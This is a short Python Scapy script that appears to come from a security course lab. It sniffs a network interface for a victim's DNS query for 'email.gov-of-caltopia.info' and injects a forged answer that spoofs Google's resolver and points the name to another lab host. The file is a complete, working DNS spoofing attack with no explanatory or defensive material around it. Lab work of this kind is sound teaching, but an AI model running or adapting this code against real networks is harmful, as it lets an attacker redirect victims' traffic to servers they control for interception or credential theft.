#!/var/lib/python/python-q3

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl

def handle_packet(pkt):
    print pkt.show
    if (DNS in pkt and pkt[IP].dst == "8.8.8.8" and pkt[IP].src == "10.87.51.131" and pkt[DNS].qd.qname == "email.gov-of-caltopia.info." ) :
    	ip = IP( src="8.8.8.8", dst="10.87.51.131")
        if UDP in pkt:
    	    udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    	    dnsqr = DNSQR(qname="email.gov-of-caltopia.info.", qtype="A", qclass="IN")
    	    dnsrr = DNSRR(rrname="email.gov-of-caltopia.info.", type="A", rclass="IN", rdata='10.87.51.132')

    	    dns = DNS(id=pkt[DNS].id, qr=1L, opcode=0, aa=0L, tc=0L, rd=1L, ra=1L, z=0L, rcode=0, qdcount=1, ancount=1,
 nscount=0, arcount=0, qd=dnsqr, an=dnsrr, ns=0, ar=0)
    	    msg = ip / udp / dns
    	    send(msg) 

    # If you wanted to send a packet back out, it might look something like... 
    # ip = IP(...)
    # tcp = TCP(...) 
    # app = ...
    # msg = ip / tcp / app 
    # send(msg) 
   
if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)

sniff(prn=handle_packet, filter='ip', iface='eth0')

